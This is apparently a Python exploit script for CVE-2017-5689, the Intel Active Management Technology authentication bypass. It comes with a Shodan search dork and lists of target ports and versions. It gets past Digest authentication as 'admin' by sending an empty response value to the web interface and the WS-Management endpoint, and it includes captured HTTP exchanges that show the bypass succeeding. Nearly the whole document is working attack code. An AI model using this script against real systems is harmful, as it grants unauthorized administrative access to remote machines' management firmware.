#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Nixawk

#   CVE-2017-5689 = {
#       dork="Server: Intel(R) Active Management Technology" port:"16992",
#       ports=[
#           623,
#           664,
#           16992,
#           16993,
#           16994,
#           16995
#       ]
#       products=[
#           Active Management Technology (AMT),
#           Intel Standard Manageability (ISM),
#           Intel Small Business Technology (SBT)
#       ]
#       version=[
#           6.x,
#           7.x,
#           8.x,
#           9.x,
#           10.x,
#           11.0,
#           11.5,
#           11.6
#       ]

import functools
import requests
import logging
import uuid


logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger(__file__)

TIMEOUT = 8


def handle_exception(func):
    functools.wraps(func)
    def wrapper(*args, **kwds):
        try:
            return func(*args, **kwds)
        except Exception as err:
            log.error(err)
            return False
    return wrapper


def intel_vulnerable_product(server):
    status = False
    products = [
        'Intel(R) Active Management Technology',
        'Intel(R) Standard Manageability',
        'Intel(R) Small Business Technology',
        'AMT'
    ]

    results = map(lambda x: x in server, products)
    status = True if (True in results) else False
    return status


@handle_exception
def exploit_web_interface(host, port):
    status = False

    url = "http://{host}:{port}/index.htm".format(host=host, port=port)
    headers = {"User-Agent": "Mozilla/5.0"}
    httprsp = requests.get(url, headers=headers, timeout=TIMEOUT)

    if not intel_vulnerable_product(httprsp.headers['Server']): return status

    """
    GET /index.htm HTTP/1.1
    Host: 192.168.1.100:16992
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0

    HTTP/1.1 401 Unauthorized
    WWW-Authenticate: Digest realm="Digest:7BA70000000000000000000000000000", nonce="/tsfAAYGAADdx+TCLSlXsW7FN7GY/hf7",stale="false",qop="auth"
    Content-Type: text/html
    Server: Intel(R) Active Management Technology 8.1.40
    Content-Length: 689
    Connection: close
    """

    www_authenticate = httprsp.headers.get('WWW-Authenticate')
    www_authenticate = www_authenticate.replace(
        'stale="false"',
        'username=admin,response=,uri=/index.htm,nc=00000001,cnonce=60513ab58858482c'
    )
    headers.update({"Authorization": www_authenticate})

    httprsp = requests.get(url, headers=headers, timeout=TIMEOUT)

    if not httprsp: return status
    if not httprsp.headers: return status
    if not intel_vulnerable_product(httprsp.headers['Server']): return status
    if httprsp.status_code == 200: status = True

    """
    GET /index.htm HTTP/1.1
    Host: 192.168.1.100:16992
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.13.0
    Authorization: Digest realm="Digest:7BA70000000000000000000000000000", nonce="/tsfAAYGAADdx+TCLSlXsW7FN7GY/hf7",username=admin,response=,uri=/index.htm,nc=00000001,cnonce=60513ab58858482c,qop="auth"

    HTTP/1.1 200 OK
    Date: Sat, 6 May 2017 03:24:33 GMT
    Server: Intel(R) Active Management Technology 8.1.40
    Content-Type: text/html
    Transfer-Encoding: chunked
    Cache-Control: no cache
    Expires: Thu, 26 Oct 1995 00:00:00 GMT

    04A9
    """
    return status


@handle_exception
def exploit_wsman(host, port):
    status = False

    url = "http://{host}:{port}/wsman".format(host=host, port=port)
    soap = (
        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tns="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_SoftwareIdentity" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wscat="http://schemas.xmlsoap.org/ws/2005/06/wsmancat" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wxf="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:wse="http://schemas.xmlsoap.org/ws/2004/08/eventing" xmlns:cim="http://schemas.dmtf.org/wbem/wscim/1/common" xmlns:wsen="http://schemas.xmlsoap.org/ws/2004/09/enumeration">'
        '  <soap:Header>'
        '    <wsa:To>{url}</wsa:To>'
        '    <wsa:ReplyTo>'
        '      <wsa:Address soap:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>'
        '    </wsa:ReplyTo>'
        '    <wsa:Action soap:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Get</wsa:Action>'
        '    <wsman:MaxEnvelopeSize soap:mustUnderstand="true">51200</wsman:MaxEnvelopeSize>'
        '    <wsa:MessageID>uuid:{uuid}</wsa:MessageID>'
        '    <wsman:ResourceURI soap:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_SoftwareIdentity</wsman:ResourceURI>'
        '    <wsman:SelectorSet>'
        '      <wsman:Selector Name="InstanceID">AMT FW Core Version</wsman:Selector>'
        '    </wsman:SelectorSet>'
        '    <wsman:OperationTimeout>PT60.000S</wsman:OperationTimeout>'
        '  </soap:Header>'
        '  <soap:Body />'
        '</soap:Envelope>'
    ).format(url=url, uuid=str(uuid.uuid4()))

    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/soap+xml; charset=UTF-8"}
    httprsp = requests.post(url, data=soap, headers=headers, timeout=TIMEOUT)

    if not intel_vulnerable_product(httprsp.headers['Server']): return status
    www_authenticate = httprsp.headers.get('WWW-Authenticate')
    www_authenticate = www_authenticate.replace(
        'stale="false"',
        'username=admin,response=,uri=/index.htm,nc=00000001,cnonce=60513ab58858482c'
    )
    headers.update({"Authorization": www_authenticate})

    httprsp = requests.post(url, data=soap, headers=headers, timeout=TIMEOUT)

    if not httprsp: return status
    if not httprsp.headers: return status
    if not intel_vulnerable_product(httprsp.headers['Server']): return status
    if httprsp.status_code == 200: status = True
    return status
